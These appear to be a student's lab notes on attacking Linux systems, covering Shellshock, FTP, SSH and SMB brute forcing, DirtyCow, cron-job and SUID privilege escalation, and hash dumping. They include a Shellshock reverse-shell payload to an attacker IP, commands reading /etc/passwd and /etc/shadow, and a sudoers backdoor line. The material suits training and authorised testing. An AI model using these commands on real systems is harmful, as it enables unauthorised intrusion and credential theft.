## Overview of Linux
- An open-source OS comprised of a linux kernel (developed by Linus torvalds) and a GNU toolkit (a collection of software and utilities developed by Richard Stallman)
- commonly referred to as GNU/Linux
- various distributions exist for various uses (distros have the same OS but diff desktop envs)
- Most used for servers

Egs:
Ubuntu -> general use
Kali -> security research (debian based)
Debian -> random stuff servers etc

Common Services:
- Apache Web server -p80/443  --> webserver like MIS,Nginx etc.  (443 if ssl configured)
- SSH -p22  --> succeser to telnet
- FTP -p21 --> usually exists with a webserver to transfer files
- SAMBA -p445  --> SMBs implemented for linux (for shares etc)

# Exploiting linux vulns

## Shellshock CVE-2014-6271
- Bash vuln most prevalent in past years
- involves apache and bash
- Family of vulns that affect bash aft ver 1.3 to allow RCE to obtain a bashshell

- Attacker runs a CGI script or .sh script on the target apache server to show output on the web interface

About bash:
- bash is a nix shell part of GNU and default for most linux distros

demo:
Run nmap to see if cgi used by server is vuln to shellshock
```bash
nmap -sV <ip> --script=http-shellshock --script-args="http-shellshock.url=/gettime.cgi"
```

Replace user agent header of get request used by the cgi with this (spacing impt):

User-agent:  () {  :;  }; echo; echo; /bin/bash -c 'cat /etc/passwd'

- Res given by server will be the executed code (gives a list of all user acts from above code)

Reverse shell:
- On attackers system:
	nc -lvnp 1234

- In burpsuite edit the CGI get request 
User-agent:  () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/(attackersIP)/1234 0>&1'

- -i>& redirects input from attacker to server
- 0>&1 redirects output to the listener on attacker machine

Check the linux distro used:
```bash
cat etc/*issue*

#kernal information
uname -a
```

MSF method for shellshock:
```msfconsole
#auxiliary module
use auxiliary/scanner/http/apache_mod_cgi_bash_env

#exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set targeturi /gettime.cgi

```

### FTP exploit
- Default TCP -p21
- Use to transfer files etc very common
- Sometime anonymous access is allowed (rare)
- Exploit a inherent vuln in FTP version or BF the credentials (Common)

Demo:
Exploits ProFTPD 1.3.5a
- Check if anonymous access enabled
	- Manually by keying `ftp 192.92.66.3` then keying anonymous and enter no password
	- nmap script (use below to find available scripts)
	`ls -al /usr/share/nmap/scripts/ | grep ftp-*`
	
-  bruteforce (set threads to 4 so service overload and go down)
	`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 ftp`

- searchsploit proFTPD

### SSH exploit
- Default TCP -p22
- remote admin protocol (used everywhere all the time)
- Auth methods
	- Username/password
	- Key based auth (use of keypair) -->unlikely unless private key is found
		- public key-> on the server 
		- private key -> with person connecting to the server, only 1 guy 

Demo:
OpenSSH has no inherent vulns
- bruteforce
	`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.93.66.3 -t 4 ssh`
	or use msfconsole ssh_login
- ssh username@`ipadr`
	enter the password etc

### Samba exploit
- smb (server message block) a network file sharing protocol share files/peripherals in a local network (LAN)
- Default TCP -p445, originally -p139 ran on top of NetBIOS (Common to have both at the same time for compatibility)

Demo:
Smb bruteforce
`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 smb`

Smb enumeration
`smbmap -H 192.56.47.3 -u admin -p password1`

Access SMB
List out all shares
`smbclient -L 192.56.47.3 -U admin`

Choose specific share
`smbclient //192.56.47.3/shawn -U admin`
`smbclient //192.56.47.3/admin -U admin`

Enter password and use like ftp
`get flag`
`get flag.tar.gzip`
`tar xzf flag.tar.gzip `

Enumerate as much info from machine (checks for nullshare if cred blank)
`enum4linux -a 192.56.47.3
`enum4linux -a -u admin -p password1 192.56.47.3`


# Linux Priv escalation

## Linux kernel exploits
target vulns within the linux kernel (differs based on ver and distribution)
- Linux-Exploit-Suggester
Note: Can cause data loss etc since the kernel itself targeted

demo:
- wget it exploit suggester on attacker
- upload suggester onto target system `upload ~/Desktop/Linux-Enum/les.sh`
- `chmod +x les.sh`
- `./les.sh`
- Most impt info is the kernel version/Architecture/Distribution/version
- Exploit given above is most likely to succeed

for this demo dirtycow exploit is used
Copy the POC code given on exploit-db
- To compile the c code --> gcc needed
- `sudo apt-get install gcc`
- rename the file or watever so the gcc command given on the POC is usable
- copy paste `gcc -pthread dirty.c -o dirty -lcrypt`
- Upload dirty on to the target
- chmod +x dirty
- `./dirty password123 `
The compile had errors as the script was not compiled on the target....
So upload the code onto the target and compile it there
``gcc -pthread dirty.c -o dirty -lcrypt``
`chmod +x dirty`
`./dirty password123

ssh in with the new user credentials and solve any errors
Admin privs shud be gotten....

## Misconfgured Cron jobs
- a scheduled task
- Run at fixed timings to run script/commands etc (backing up/Run a shell script)
- Can be run as any user/system
- If run by root, will execute with root privs

demo:
- student user unprived
- found sus message.txt
- Find recoursively from /usr if there are any script routing from from/to /home/student/message
`grep -rnw /usr -e "/home/student/message"`
- 2 places found /tmp/message and /usr/local/share/copy
- ls -al the script found in /usr/local/share/copy.sh to see the privs (can be edited)

- Since the editors exist on the target use printf and edit it onto the .sh script
`printf "#!/bin/bash\n echo 'student ALL=NOPASSWD:ALL' >> /etc/sudoers" > /usr/local/share/copy.sh`

(allows use of sudo w/o password)

- sudo su  --> upgrade from student to root
- crontab -l  ---> see the cronjobs being run by current user
- cat /etc/shadows

tldr:
1. find the .sh scirpt
2. see if its writable
3. write priv command


### Exploit SUID binaries
- Set owner User ID (SUID)
- SUID is a permission ontop of the main 3 (read,write and execute)
- when the permission is applied to a file, allows execution with permissions of the file owner
- Typically for unpriveledged user to execute certain things with privs
Note: Does not mean script can be changed. Only executed.
Common example is sudo

 - prerequisites to priv
	 - Owner of the binary must be priveledged (pref root)
	 - Access permission -> will require x permission
Demo:
Find binary with the s and x permission (s is for SUID and x executable)
`ls -al`
- Static Analysis on the "welcome" binary found in the system:
`file welcome` --> analyse shared objects on the file 
						--> if find missing shared objects
						--> can create ur own shared object and get binary to load it (eg /bin/bash)
No shared objects missing

`strings welcome` --> outputs the strings found in the binary
							--> "greetings" binary is executed
Exploit is just to change the greetings binary to 1 that execs /bin/bash binary
1. `rm greetings`
2. `cp /bin/bash greetings` --> copys the bash binary as "greetings"
3. `./welcome`


## Dumping Linux password hashes

- On linux password hashes has no use unless cracked unlike NTLM on windows
- For linux, all acct info are stored in /etc/passwd accessible by all users !!!
- Encrypted passwords are stored in /etc/shadow only root can access.
- The type of encryption used can be found in the passwd file --> username$(no. for hash)

$1 MD5
$2 blowfish
$5 sha256
$6 sha512

Demo:
vuln ProFTPD 1.3.3c used 
searchsploit...use
cmd is given
--> `/bin/bash -i` spawn interactive bash shell
--> background the session (ctrl + z ) 
--> upgrade session to meterpreter
`sessions -u 1`

or use a msf module
`use post/linux/gather/hashdump`
--> provides hash and unshadowed hash used for cracking
/root/.msf4/loot/20230302105405_default_192.217.123.3_linux.hashes_445127.txt

crack the password using hashcat/john or msf /crack_linux module 
- To use msfmodule, before starting up msfconsole:

run `/etc/init.d/postgresql start` to start the database to save the hashed password found from /hashdump module
